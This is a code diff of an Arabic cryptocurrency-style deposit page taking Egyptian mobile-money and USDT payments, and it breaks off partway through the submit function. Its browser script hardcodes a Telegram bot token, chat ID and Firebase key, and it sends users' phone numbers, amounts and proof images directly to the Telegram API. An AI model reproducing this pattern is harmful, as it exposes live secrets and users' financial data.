@@ -3,234 +3,202 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>إيداع الرصيد - PharaCoin | شحن المحفظة بعملات رقمية</title>
-    <meta name="description" content="قم بإيداع الرصيد في PharaCoin عبر فودافون كاش، اتصالات كاش، اورنج كاش، أو USDT. أقل مبلغ 50 جنيه، واحصل على مكافآت إضافية تصل إلى 50% بونص.">
-    <meta name="keywords" content="PharaCoin, إيداع, شحن رصيد, فودافون كاش, USDT, عملات رقمية">
-    <meta name="author" content="PharaCoin Team">
-    <meta name="robots" content="noindex, nofollow">
-
-    <!-- Open Graph / Twitter -->
-    <meta property="og:title" content="إيداع الرصيد - PharaCoin">
-    <meta property="og:description" content="اشحن محفظتك بسرعة وأمان عبر وسائل دفع متعددة واحصل على بونص يصل إلى 50%.">
-    <meta property="og:image" content="https://pharacoin.pages.dev/og-image.jpg">
-    <meta property="og:url" content="https://pharacoin.pages.dev/deposit.html">
-    <meta property="og:type" content="website">
-    <meta property="og:site_name" content="PharaCoin">
-
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="إيداع الرصيد - PharaCoin">
-    <meta name="twitter:description" content="اشحن محفظتك بسرعة وأمان واحصل على بونص.">
-    <meta name="twitter:image" content="https://pharacoin.pages.dev/twitter-image.jpg">
-    <meta name="twitter:site" content="@PharaCoinApp">
-
-    <link rel="canonical" href="https://pharacoin.pages.dev/deposit.html">
-
-    <!-- Structured Data -->
-    <script type="application/ld+json">
-    {
-        "@context": "https://schema.org",
-        "@type": "WebPage",
-        "name": "إيداع الرصيد - PharaCoin",
-        "description": "صفحة إيداع الرصيد في PharaCoin.",
-        "url": "https://pharacoin.pages.dev/deposit.html",
-        "isPartOf": {
-            "@type": "WebSite",
-            "name": "PharaCoin",
-            "url": "pharacoin.pages.dev"
-        }
-    }
-    </script>
-
+    <title>إيداع الرصيد • المتحف الكبير</title>
+    <meta name="description" content="قم بإيداع الرصيد عبر فودافون كاش، اتصالات كاش، اورنج كاش، أو USDT. أقل مبلغ 50 جنيه.">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
-
-    <!-- Firebase SDK -->
+    <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-
     <style>
         *{margin:0;padding:0;box-sizing:border-box;}
-
         body{
-          font-family:'Cairo',sans-serif;
-          background:url("Object/qa.jpg") no-repeat center center fixed;
-          background-size:cover;
-          color:white;
-          max-width:420px;
-          margin:auto;
+            font-family:'Cairo',sans-serif;
+            background:url("Object/qa.jpg") no-repeat center center fixed;
+            background-size:cover;
+            color:white;
+            max-width:420px;
+            margin:auto;
         }
-
         body::before{
-          content:"";
-          position:fixed;
-          inset:0;
-          background:rgba(0,0,0,0.85);
-          z-index:-1;
+            content:"";
+            position:fixed;
+            inset:0;
+            background:rgba(0,0,0,0.85);
+            z-index:-1;
         }
-
         .toast-container{
-          position:fixed;
-          top:20px;
-          left:50%;
-          transform:translateX(-50%);
-          z-index:9999;
-          display:flex;
-          flex-direction:column;
-          gap:10px;
-          pointer-events:none;
-          max-width:350px;
-          width:90%;
+            position:fixed;
+            top:20px;
+            left:50%;
+            transform:translateX(-50%);
+            z-index:9999;
+            display:flex;
+            flex-direction:column;
+            gap:10px;
+            pointer-events:none;
+            max-width:350px;
+            width:90%;
         }
         .toast{
-          background:rgba(20,0,0,0.95);
-          border:2px solid #FF0000;
-          border-radius:12px;
-          padding:12px 18px;
-          color:white;
-          font-family:'Cairo',sans-serif;
-          font-size:14px;
-          font-weight:bold;
-          box-shadow:0 0 30px #FF0000, 0 0 60px rgba(255,215,0,0.3);
-          animation:toastIn 0.3s ease-out, toastOut 0.3s ease-in 2.5s forwards;
-          display:flex;
-          align-items:center;
-          gap:10px;
-          backdrop-filter:blur(10px);
-          text-align:center;
-          justify-content:center;
+            background:rgba(20,0,0,0.95);
+            border:2px solid #FF0000;
+            border-radius:12px;
+            padding:12px 18px;
+            color:white;
+            font-weight:bold;
+            box-shadow:0 0 30px #FF0000;
+            animation:toastIn 0.3s ease-out, toastOut 0.3s ease-in 2.5s forwards;
+            text-align:center;
+            backdrop-filter:blur(10px);
         }
         .toast.success{ border-color:#00ff00; box-shadow:0 0 30px #00ff00; }
-        .toast.error{ border-color:#FF0000; box-shadow:0 0 30px #FF0000; }
-        .toast.warning{ border-color:#FFA500; box-shadow:0 0 30px #FFA500; }
-        @keyframes toastIn{
-          from{opacity:0;transform:translateY(-20px);}
-          to{opacity:1;transform:translateY(0);}
-        }
-        @keyframes toastOut{
-          from{opacity:1;}
-          to{opacity:0;transform:translateY(-20px);}
-        }
-
+        .toast.error{ border-color:#FF0000; }
+        @keyframes toastIn{ from{opacity:0;transform:translateY(-20px);} to{opacity:1;transform:translateY(0);} }
+        @keyframes toastOut{ from{opacity:1;} to{opacity:0;transform:translateY(-20px);} }
         .header{
-          position:sticky;
-          top:0;
-          display:flex;
-          justify-content:space-between;
-          align-items:center;
-          padding:15px;
-          background:rgba(0,0,0,0.9);
-          border-bottom:1px solid rgba(255,215,0,0.3);
-          backdrop-filter:blur(10px);
-          z-index:10;
+            position:sticky;
+            top:0;
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            padding:15px;
+            background:rgba(0,0,0,0.9);
+            border-bottom:1px solid rgba(255,215,0,0.3);
+            backdrop-filter:blur(10px);
+            z-index:10;
         }
-        .header h1{
-          font-size:18px;
-          font-weight:900;
-          color:gold;
-          text-shadow:0 0 15px gold;
-          margin:0;
-        }
-        .back{
-          font-size:13px;
-          color:#00ffcc;
-          cursor:pointer;
-        }
-
-        .container{
-          padding:15px;
-          display:flex;
-          flex-direction:column;
-          gap:18px;
-        }
-
+        .header h1{ font-size:18px; font-weight:900; color:gold; text-shadow:0 0 15px gold; margin:0; }
+        .back{ font-size:13px; color:#00ffcc; cursor:pointer; }
+        .container{ padding:15px; display:flex; flex-direction:column; gap:18px; }
         .card{
-          background:rgba(0,0,0,0.7);
-          border:2px solid gold;
-          border-radius:20px;
-          padding:15px;
-          box-shadow:0 0 15px rgba(255,215,0,0.4);
+            background:rgba(0,0,0,0.7);
+            border:2px solid gold;
+            border-radius:20px;
+            padding:15px;
+            box-shadow:0 0 15px rgba(255,215,0,0.4);
         }
-
         .data-field{
-          background:#111;
-          padding:14px;
-          border-radius:12px;
-          word-break:break-all;
-          text-align:center;
-          border:1px solid gold;
-          font-weight:bold;
-          color:#00ffcc;
-          margin-bottom:10px;
+            background:#111;
+            padding:14px;
+            border-radius:12px;
+            word-break:break-all;
+            text-align:center;
+            border:1px solid gold;
+            font-weight:bold;
+            color:#00ffcc;
+            margin-bottom:10px;
         }
-
+        .wallet-network {
+            text-align: center;
+            color: #ffaa00;
+            font-size: 13px;
+            margin-top: -5px;
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
         select, input{
-          width:100%;
-          padding:14px;
-          margin-bottom:12px;
-          border-radius:12px;
-          border:1px solid gold;
-          background:#0e0e0e;
-          color:white;
-          font-family:'Cairo',sans-serif;
+            width:100%;
+            padding:14px;
+            margin-bottom:12px;
+            border-radius:12px;
+            border:1px solid gold;
+            background:#0e0e0e;
+            color:white;
+            font-family:'Cairo',sans-serif;
         }
-
-        .coins-result{
-          text-align:center;
-          color:red;
-          font-weight:bold;
-          margin-bottom:10px;
-        }
-
         button{
-          width:100%;
-          padding:12px;
-          border:none;
-          border-radius:15px;
-          background:gold;
-          color:black;
-          font-weight:bold;
-          cursor:pointer;
-          box-shadow:0 0 15px gold;
-          font-family:'Cairo',sans-serif;
-          margin-bottom:8px;
-          transition:all 0.2s;
+            width:100%;
+            padding:12px;
+            border:none;
+            border-radius:15px;
+            background:gold;
+            color:black;
+            font-weight:bold;
+            cursor:pointer;
+            box-shadow:0 0 15px gold;
+            font-family:'Cairo',sans-serif;
+            margin-bottom:8px;
+            transition:all 0.2s;
         }
         button:hover:not(:disabled){ background:orange; }
-        button:disabled{
-          opacity:0.5;
-          cursor:not-allowed;
-        }
-
+        button:disabled{ opacity:0.5; cursor:not-allowed; }
         .note{
-          text-align:center;
-          margin-top:8px;
-          font-size:14px;
-          opacity:.85;
+            text-align:center;
+            margin-top:8px;
+            font-size:14px;
+            opacity:.85;
         }
-
-        .loader {
-          display: none;
-          width: 20px;
-          height: 20px;
-          border: 3px solid #f3f3f3;
-          border-top: 3px solid gold;
-          border-radius: 50%;
-          animation: spin 1s linear infinite;
-          margin: 10px auto;
+        .loader{
+            display:none;
+            width:20px;
+            height:20px;
+            border:3px solid #f3f3f3;
+            border-top:3px solid gold;
+            border-radius:50%;
+            animation:spin 1s linear infinite;
+            margin:10px auto;
         }
-        @keyframes spin {
-          0% { transform: rotate(0deg); }
-          100% { transform: rotate(360deg); }
+        @keyframes spin{ 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
+        .file-info{
+            font-size:12px;
+            color:#00ff9d;
+            margin-top:-8px;
+            margin-bottom:10px;
+            display:none;
         }
-
-        .file-info {
-          font-size: 12px;
-          color: #00ff9d;
-          margin-top: -8px;
-          margin-bottom: 10px;
-          display: none;
+        .bottom-nav{
+            position:fixed; bottom:0; left:0; right:0;
+            max-width:480px; margin:0 auto;
+            background:linear-gradient(180deg, #8b1a1a, #6a0d0d);
+            display:flex; justify-content:space-around;
+            padding:10px 0 18px;
+            border-top:3px solid #e6b422;
+            box-shadow:0 -5px 20px rgba(0,0,0,0.8);
+            z-index:100;
         }
+        .nav-item{
+            text-align:center;
+            cursor:pointer;
+            transition:transform 0.2s;
+            width:70px;
+        }
+        .nav-item:active{ transform:scale(0.95); }
+        .nav-circle{
+            width:55px; height:55px;
+            border-radius:50%;
+            background:#1a0e0e;
+            border:2px solid #b22222;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            font-size:30px;
+            color:#b22222;
+            margin:0 auto 4px;
+            transition:all 0.3s;
+            box-shadow:0 0 10px rgba(180,40,40,0.6);
+        }
+        .nav-item.current-page .nav-circle{
+            color:#FFD700;
+            border-color:#FFD700;
+            box-shadow:0 0 15px #FFD700;
+            animation:pulse 1.5s infinite;
+        }
+        @keyframes pulse{
+            0%{box-shadow:0 0 5px #FFD700;}
+            50%{box-shadow:0 0 20px #FFD700;}
+            100%{box-shadow:0 0 5px #FFD700;}
+        }
+        .nav-label{
+            font-size:12px;
+            font-weight:700;
+            color:#ffdb8e;
+            text-shadow:0 0 5px #b8860b;
+            display:none;
+            height:18px;
+            margin-top:2px;
+        }
+        .nav-item.showing .nav-label{ display:block; }
     </style>
 </head>
 <body>
@@ -238,338 +206,284 @@
 <div class="toast-container" id="toastContainer"></div>
 
 <div class="header">
-  <h1>💰 إيداع الرصيد</h1>
-  <div class="back" onclick="goBack()">⬅ رجوع</div>
+    <h1>💰 إيداع الرصيد</h1>
+    <div class="back" onclick="goBack()">⬅ رجوع</div>
 </div>
 
 <div class="container">
+    <div class="card">
+        <div class="data-field" id="phone">01069806835</div>
+        <button onclick="copyText('phone')">نسخ رقم الإيداع</button>
 
-<div class="card">
-  <div class="data-field" id="phone">01069806835</div>
-  <button onclick="copyText('phone')">نسخ رقم الإيداع</button>
+        <br><br>
 
-  <br>
+        <div class="data-field" id="wallet">TPNgUyRe7GSnazUzakRU3egEU4XBS7Pu5h</div>
+        <div class="wallet-network">TRC20 Network</div>
+        <button onclick="copyText('wallet')">نسخ عنوان محفظة USDT</button>
 
-  <div class="data-field" id="wallet">TPNgUyRe7GSnazUzakRU3egEU4XBS7Pu5h</div>
-  <button onclick="copyText('wallet')">نسخ عنوان محفظة USDT</button>
+        <div class="note">💱 ملحوظة: 1$ = 50 جنيه</div>
+    </div>
 
-  <div class="note">💱 ملحوظة: 1$ = 50 جنيه</div>
+    <div class="card">
+        <select id="method" onchange="changePlaceholder()">
+            <option value="">اختر طريقة الإيداع</option>
+            <option value="فودافون كاش">فودافون كاش</option>
+            <option value="اتصالات كاش">اتصالات كاش</option>
+            <option value="اورنج كاش">اورنج كاش</option>
+            <option value="USDT">USDT</option>
+        </select>
+
+        <input type="text" id="fromNumber" placeholder="أدخل الرقم الذي تم التحويل منه">
+
+        <input type="number" id="amount" placeholder="أدخل مبلغ الإيداع بالجنيه" min="50">
+
+        <!-- حقل العملات المحذوف -->
+        <!-- <div class="coins-result" id="coinsResult"></div> -->
+
+        <input type="file" id="proof" accept="image/*" onchange="checkFileSize()">
+        <div class="file-info" id="fileInfo"></div>
+
+        <div class="loader" id="loader"></div>
+
+        <button onclick="confirmDeposit(event)" id="submitBtn">تقديم طلب الإيداع</button>
+
+        <div class="note">يرجى رفع صورة إثبات التحويل لتأكيد الإيداع</div>
+    </div>
+
+    <button onclick="location.href='dashboard.html'">العودة للوحة التحكم</button>
 </div>
 
-<div class="card">
-
-<select id="method" onchange="changePlaceholder()">
-  <option value="">اختر طريقة الإيداع</option>
-  <option value="فودافون كاش">فودافون كاش</option>
-  <option value="اتصالات كاش">اتصالات كاش</option>
-  <option value="اورنج كاش">اورنج كاش</option>
-  <option value="USDT">USDT</option>
-</select>
-
-<input type="text" id="fromNumber" placeholder="أدخل الرقم الذي تم التحويل منه">
-
-<input type="number" id="amount" placeholder="أدخل مبلغ الإيداع بالجنيه" oninput="calcCoins()" min="50">
-
-<div class="coins-result" id="coinsResult"></div>
-
-<input type="file" id="proof" accept="image/*" onchange="checkFileSize()">
-<div class="file-info" id="fileInfo"></div>
-
-<!-- مؤشر التحميل -->
-<div class="loader" id="loader"></div>
-
-<button onclick="confirmDeposit(event)" id="submitBtn">تقديم طلب الإيداع</button>
-
-<div class="note">يرجى رفع صورة إثبات التحويل لتأكيد الإيداع</div>
-
-</div>
-
-<button onclick="location.href='dashboard.html'">العودة للوحة التحكم</button>
-
+<!-- Bottom Nav -->
+<div class="bottom-nav">
+    <div class="nav-item" data-url="dashboard.html" data-label="الرئيسية" data-egypt="𓂀" data-alt="🏠">
+        <div class="nav-circle">𓂀</div><div class="nav-label">الرئيسية</div>
+    </div>
+    <div class="nav-item" data-url="museum.html" data-label="المتحف" data-egypt="𓆣" data-alt="🏺">
+        <div class="nav-circle">𓆣</div><div class="nav-label">المتحف</div>
+    </div>
+    <div class="nav-item" data-url="statue1.html" data-label="المرحلة 1" data-egypt="𓁹" data-alt="⚒️">
+        <div class="nav-circle">𓁹</div><div class="nav-label">المرحلة 1</div>
+    </div>
+    <div class="nav-item" data-url="profile.html" data-label="حسابي" data-egypt="☥" data-alt="👤">
+        <div class="nav-circle">☥</div><div class="nav-label">حسابي</div>
+    </div>
 </div>
 
 <script>
-// ========== متغيرات تيليجرام (غير آمنة - للاستخدام المؤقت) ==========
+// ========== متغيرات تيليجرام ==========
 const TELEGRAM_TOKEN = "8535863939:AAFC4qgREiGQC-4c1QCQNrNp3gMprRsQRTs";
 const TELEGRAM_CHAT_ID = "6733319757";
 
 // ========== Toast ==========
-function showCustomToast(message, type = 'success') {
-  const container = document.getElementById('toastContainer');
-  const toast = document.createElement('div');
-  toast.className = 'toast ' + type;
-  const icons = { success: '✅', error: '❌', warning: '⚠️', info: 'ℹ️' };
-  toast.innerHTML = (icons[type] || '✅') + ' ' + message;
-  container.appendChild(toast);
-  setTimeout(() => toast.remove(), 3000);
+function showCustomToast(msg, type='success'){
+    const container = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = 'toast '+type;
+    toast.innerHTML = (type==='success'?'✅ ':'❌ ') + msg;
+    container.appendChild(toast);
+    setTimeout(()=>toast.remove(), 3000);
 }
 
-// ========== Firebase Config ==========
+// ========== Firebase ==========
 firebase.initializeApp({
-  apiKey: "AIzaSyB78JT_cbPMizvzKWBrQoQUe3-zukHrr1U",
-  authDomain: "pharacoin.firebaseapp.com",
-  projectId: "pharacoin"
+    apiKey: "AIzaSyB78JT_cbPMizvzKWBrQoQUe3-zukHrr1U",
+    authDomain: "pharacoin.firebaseapp.com",
+    projectId: "pharacoin"
 });
-
 const auth = firebase.auth();
 const db = firebase.firestore();
 
-// التحقق من تسجيل الدخول
-auth.onAuthStateChanged(user => {
-  if (!user) window.location.href = "login.html";
-});
+auth.onAuthStateChanged(user => { if(!user) window.location.href="login.html"; });
 
 const minAmount = 50;
-const MAX_DOCUMENT_SIZE = 900 * 1024; // 900 كيلوبايت (نترك مساحة للحقول الأخرى)
-const BASE64_OVERHEAD = 1.37; // Base64 يزيد الحجم بحوالي 37%
+const MAX_DOCUMENT_SIZE = 900 * 1024;
+const BASE64_OVERHEAD = 1.37;
 
 function copyText(id){
-  const text = document.getElementById(id).innerText;
-  navigator.clipboard.writeText(text);
-  showCustomToast('تم النسخ', 'success');
+    const text = document.getElementById(id).innerText;
+    navigator.clipboard.writeText(text);
+    showCustomToast('تم النسخ', 'success');
 }
 
 function changePlaceholder(){
-  const method = document.getElementById("method").value;
-  const input = document.getElementById("fromNumber");
-  input.placeholder = method === "USDT" ? "أدخل عنوان محفظتك" : "أدخل الرقم الذي تم التحويل منه";
+    const method = document.getElementById("method").value;
+    const input = document.getElementById("fromNumber");
+    input.placeholder = method === "USDT" ? "أدخل عنوان محفظتك" : "أدخل الرقم الذي تم التحويل منه";
 }
 
-function calcCoins(){
-  const amount = parseFloat(document.getElementById("amount").value);
-  const result = document.getElementById("coinsResult");
-  if(amount && amount > 0){
-    if(amount < minAmount){
-      result.innerText = "أقل إيداع 50 جنيه";
+// تم إلغاء calcCoins
+// function calcCoins(){ ... }
+
+function validatePhoneNumber(phone, method){
+    const clean = phone.replace(/\s+/g,'').replace(/[^\d]/g,'');
+    const prefixes = {
+        'فودافون كاش': ['010','015','016'],
+        'اتصالات كاش': ['011'],
+        'اورنج كاش': ['012']
+    };
+    if(!prefixes[method]) return true;
+    if(clean.length !== 11) return false;
+    return prefixes[method].some(p => clean.startsWith(p));
+}
+
+function checkFileSize(){
+    const file = document.getElementById('proof').files[0];
+    const fileInfo = document.getElementById('fileInfo');
+    if(!file){ fileInfo.style.display='none'; return; }
+    const estimatedBase64Size = file.size * BASE64_OVERHEAD;
+    const estimatedTotalSize = estimatedBase64Size + 5000;
+    fileInfo.style.display='block';
+    if(estimatedTotalSize > MAX_DOCUMENT_SIZE){
+        fileInfo.innerHTML = `⚠️ حجم الصورة كبير جداً. الحد الأقصى ${(MAX_DOCUMENT_SIZE/1024).toFixed(0)} كيلوبايت`;
+        fileInfo.style.color='#ff6666';
     } else {
-      const coins = amount * 2;
-      result.innerText = `سيتم إضافة ${coins} Coins (تقديري)`;
+        fileInfo.innerHTML = `✅ حجم مناسب.`;
+        fileInfo.style.color='#00ff9d';
     }
-  } else {
-    result.innerText = "";
-  }
 }
 
-// التحقق من الرقم حسب الشركة
-function validatePhoneNumber(phone, method) {
-  const clean = phone.replace(/\s+/g, '').replace(/[^\d]/g, '');
-  const prefixes = {
-    'فودافون كاش': ['010', '015', '016'],
-    'اتصالات كاش': ['011'],
-    'اورنج كاش': ['012']
-  };
-  if (!prefixes[method]) return true;
-  if (clean.length !== 11) return false;
-  return prefixes[method].some(p => clean.startsWith(p));
+function fileToBase64(file){
+    return new Promise((resolve, reject) => {
+        const reader = new FileReader();
+        reader.readAsDataURL(file);
+        reader.onload = () => resolve(reader.result);
+        reader.onerror = error => reject(error);
+    });
 }
 
-// التحقق من حجم الصورة وحساب الحجم المتوقع بعد التشفير
-function checkFileSize() {
-  const file = document.getElementById('proof').files[0];
-  const fileInfo = document.getElementById('fileInfo');
-  
-  if (!file) {
-    fileInfo.style.display = 'none';
-    return;
-  }
-  
-  // حساب الحجم المتوقع بعد تحويل Base64
-  const estimatedBase64Size = file.size * BASE64_OVERHEAD;
-  const estimatedTotalSize = estimatedBase64Size + 5000; // ~5KB للبيانات الأخرى
-  
-  fileInfo.style.display = 'block';
-  
-  if (estimatedTotalSize > MAX_DOCUMENT_SIZE) {
-    fileInfo.innerHTML = `⚠️ حجم الصورة كبير جداً. الحجم المتوقع بعد التشفير: ${(estimatedTotalSize / 1024).toFixed(2)} كيلوبايت (الحد الأقصى 900 كيلوبايت)`;
-    fileInfo.style.color = '#ff6666';
-  } else {
-    fileInfo.innerHTML = `✅ حجم مناسب. الحجم المتوقع بعد التشفير: ${(estimatedTotalSize / 1024).toFixed(2)} كيلوبايت`;
-    fileInfo.style.color = '#00ff9d';
-  }
+function calculateEstimatedSize(base64Image, otherData){
+    return (base64Image.length * 2) + (JSON.stringify(otherData).length * 2);
 }
 
-// تحويل الصورة إلى Base64
-function fileToBase64(file) {
-  return new Promise((resolve, reject) => {
-    const reader = new FileReader();
-    reader.readAsDataURL(file);
-    reader.onload = () => resolve(reader.result);
-    reader.onerror = error => reject(error);
-  });
-}
-
-// حساب الحجم التقريبي للمستند
-function calculateEstimatedSize(base64Image, otherData) {
-  const base64Size = base64Image.length * 2; // تقريب: كل حرف UTF-16 ≈ 2 بايت
-  const otherDataSize = JSON.stringify(otherData).length * 2;
-  return base64Size + otherDataSize;
-}
-
-// ========== دالة إرسال إشعار إلى تيليجرام ==========
-async function sendToTelegram(depositData, imageBase64) {
-  try {
-    // إرسال رسالة نصية تحتوي على التفاصيل
-    const message = `
+async function sendToTelegram(depositData, imageBase64){
+    try{
+        const message = `
 🆕 طلب إيداع جديد
-👤 المستخدم: ${depositData.username || 'غير معروف'}
-🔹 طريقة الدفع: ${depositData.method}
-📞 الرقم المحول منه: ${depositData.fromNumber}
+👤 ${depositData.username || 'غير معروف'}
+🔹 الطريقة: ${depositData.method}
+📞 الرقم: ${depositData.fromNumber}
 💰 المبلغ: ${depositData.amount} جنيه
-🪙 العملات المستحقة: ${depositData.coins} Coins
-🆔 معرف المستخدم: ${depositData.userId}
-🕐 الوقت: ${new Date().toLocaleString('ar-EG')}
-    `;
-
-    // إرسال الرسالة النصية أولاً
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-      })
-    });
-
-    // إرسال الصورة كملف
-    // تحويل Base64 إلى Blob
-    const base64Data = imageBase64.split(',')[1]; // إزالة الرأس data:image/...
-    const mimeType = imageBase64.match(/:(.*?);/)[1];
-    const byteCharacters = atob(base64Data);
-    const byteNumbers = new Array(byteCharacters.length);
-    for (let i = 0; i < byteCharacters.length; i++) {
-      byteNumbers[i] = byteCharacters.charCodeAt(i);
-    }
-    const byteArray = new Uint8Array(byteNumbers);
-    const blob = new Blob([byteArray], { type: mimeType });
-
-    // إنشاء FormData وإرسال الصورة
-    const formData = new FormData();
-    formData.append('chat_id', TELEGRAM_CHAT_ID);
-    formData.append('document', blob, 'proof_image.jpg'); // اسم الملف
-
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
-      method: 'POST',
-      body: formData
-    });
-
-    console.log('تم إرسال الإشعار إلى تيليجرام');
-  } catch (e) {
-    console.error('فشل إرسال إشعار تيليجرام:', e);
-    // لا نوقف العملية إذا فشل الإشعار
-  }
+🆔 ${depositData.userId}
+🕐 ${new Date().toLocaleString('ar-EG')}`;
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+        });
+        const base64Data = imageBase64.split(',')[1];
+        const mimeType = imageBase64.match(/:(.*?);/)[1];
+        const byteCharacters = atob(base64Data);
+        const byteNumbers = new Array(byteCharacters.length);
+        for(let i=0;i<byteCharacters.length;i++) byteNumbers[i] = byteCharacters.charCodeAt(i);
+        const blob = new Blob([new Uint8Array(byteNumbers)], {type: mimeType});
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('document', blob, 'proof.jpg');
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, { method:'POST', body: formData });
+    }catch(e){ console.warn('Telegram error'); }
 }
 
 async function confirmDeposit(event){
-  const method = document.getElementById("method").value;
-  const fromNumber = document.getElementById("fromNumber").value.trim();
-  const amount = parseFloat(document.getElementById("amount").value);
-  const proofFile = document.getElementById("proof").files[0];
-  const submitBtn = document.getElementById("submitBtn");
-  const loader = document.getElementById("loader");
+    const method = document.getElementById("method").value;
+    const fromNumber = document.getElementById("fromNumber").value.trim();
+    const amount = parseFloat(document.getElementById("amount").value);
+    const proofFile = document.getElementById("proof").files[0];
+    const submitBtn = document.getElementById("submitBtn");
+    const loader = document.getElementById("loader");
 
-  // التحقق من البيانات
-  if (!method || !fromNumber || !amount || !proofFile) {
-    showCustomToast("يرجى إدخال جميع البيانات ورفع صورة الإثبات", "error");
-    return;
-  }
-
-  if (amount < minAmount) {
-    showCustomToast("أقل مبلغ للإيداع هو 50 جنيه", "error");
-    return;
-  }
-
-  // التحقق من حجم الصورة
-  const estimatedBase64Size = proofFile.size * BASE64_OVERHEAD;
-  const estimatedTotalSize = estimatedBase64Size + 5000;
-  
-  if (estimatedTotalSize > MAX_DOCUMENT_SIZE) {
-    showCustomToast(`حجم الصورة كبير جداً. الحد الأقصى للصورة هو ${Math.floor(MAX_DOCUMENT_SIZE / BASE64_OVERHEAD / 1024)} كيلوبايت`, "error");
-    return;
-  }
-
-  if (method !== "USDT") {
-    if (!validatePhoneNumber(fromNumber, method)) {
-      let msg = "";
-      if (method === "فودافون كاش") msg = "رقم فودافون كاش يجب أن يبدأ بـ 010 أو 015 أو 016 ويتكون من 11 رقم";
-      else if (method === "اتصالات كاش") msg = "رقم اتصالات كاش يجب أن يبدأ بـ 011 ويتكون من 11 رقم";
-      else if (method === "اورنج كاش") msg = "رقم اورنج كاش يجب أن يبدأ بـ 012 ويتكون من 11 رقم";
-      showCustomToast(msg, "error");
-      return;
+    if(!method || !fromNumber || !amount || !proofFile){
+        showCustomToast("يرجى إدخال جميع البيانات ورفع صورة الإثبات", "error");
+        return;
     }
-  }
-
-  const user = auth.currentUser;
-  if (!user) {
-    window.location.href = "login.html";
-    return;
-  }
-
-  // تعطيل الزر وإظهار مؤشر التحميل
-  submitBtn.disabled = true;
-  submitBtn.innerText = "جاري المعالجة...";
-  loader.style.display = "block";
-
-  try {
-    // تحويل الصورة إلى Base64
-    const proofBase64 = await fileToBase64(proofFile);
-
-    // حساب العملات
-    const coins = amount * 2;
-
-    // إعداد بيانات الطلب
-    const depositData = {
-      userId: user.uid,
-      username: localStorage.getItem("profileName") || "",
-      method,
-      fromNumber,
-      amount,
-      coins,
-      proofBase64: proofBase64,
-      status: "pending",
-      createdAt: firebase.firestore.FieldValue.serverTimestamp()
-    };
-
-    // التحقق النهائي من حجم المستند
-    const estimatedSize = calculateEstimatedSize(proofBase64, depositData);
-    if (estimatedSize > 1048576) { // 1MB
-      showCustomToast("المستند كبير جداً (أكثر من 1 ميجابايت). حاول استخدام صورة أصغر.", "error");
-      submitBtn.disabled = false;
-      submitBtn.innerText = "تقديم طلب الإيداع";
-      loader.style.display = "none";
-      return;
+    if(amount < minAmount){
+        showCustomToast("أقل مبلغ للإيداع هو 50 جنيه", "error");
+        return;
+    }
+    const estimatedBase64Size = proofFile.size * BASE64_OVERHEAD;
+    if((estimatedBase64Size + 5000) > MAX_DOCUMENT_SIZE){
+        showCustomToast(`حجم الصورة كبير جداً. الحد الأقصى ${Math.floor(MAX_DOCUMENT_SIZE/BASE64_OVERHEAD/1024)} كيلوبايت`, "error");
+        return;
+    }
+    if(method !== "USDT" && !validatePhoneNumber(fromNumber, method)){
+        let msg = "";
+        if(method==="فودافون كاش") msg = "رقم فودافون كاش يجب أن يبدأ بـ 010/015/016";
+        else if(method==="اتصالات كاش") msg = "رقم اتصالات كاش يجب أن يبدأ بـ 011";
+        else msg = "رقم اورنج كاش يجب أن يبدأ بـ 012";
+        showCustomToast(msg, "error");
+        return;
     }
 
-    // حفظ الطلب في Firestore
-    await db.collection("deposits").add(depositData);
+    const user = auth.currentUser;
+    if(!user){ window.location.href="login.html"; return; }
 
-    // إرسال إشعار إلى تيليجرام (لا ننتظر حتى يكتمل)
-    sendToTelegram(depositData, proofBase64).catch(e => console.error(e));
+    submitBtn.disabled = true;
+    submitBtn.innerText = "جاري المعالجة...";
+    loader.style.display = "block";
 
-    showCustomToast("تم إرسال طلب الإيداع بنجاح، سيتم مراجعته قريباً", "success");
-    
-    // الانتقال إلى صفحة التحويلات بعد ثانيتين
-    setTimeout(() => {
-      window.location.href = "transactions.html";
-    }, 2000);
-
-  } catch (err) {
-    console.error(err);
-    if (err.code === 'resource-exhausted' || err.message.includes('exceeds maximum size')) {
-      showCustomToast("الصورة كبيرة جداً. الحد الأقصى 700 كيلوبايت", "error");
-    } else {
-      showCustomToast("حدث خطأ: " + err.message, "error");
+    try{
+        const proofBase64 = await fileToBase64(proofFile);
+        const depositData = {
+            userId: user.uid,
+            username: localStorage.getItem("profileName") || "",
+            method,
+            fromNumber,
+            amount,
+            status: "pending",
+            createdAt: firebase.firestore.FieldValue.serverTimestamp()
+        };
+        const estimatedSize = calculateEstimatedSize(proofBase64, depositData);
+        if(estimatedSize > 1048576){
+            showCustomToast("المستند كبير جداً. حاول استخدام صورة أصغر.", "error");
+            submitBtn.disabled = false;
+            submitBtn.innerText = "تقديم طلب الإيداع";
+            loader.style.display = "none";
+            return;
+        }
+        await db.collection("deposits").add({ ...depositData, proofBase64 });
+        sendToTelegram(depositData, proofBase64).catch(e=>{});
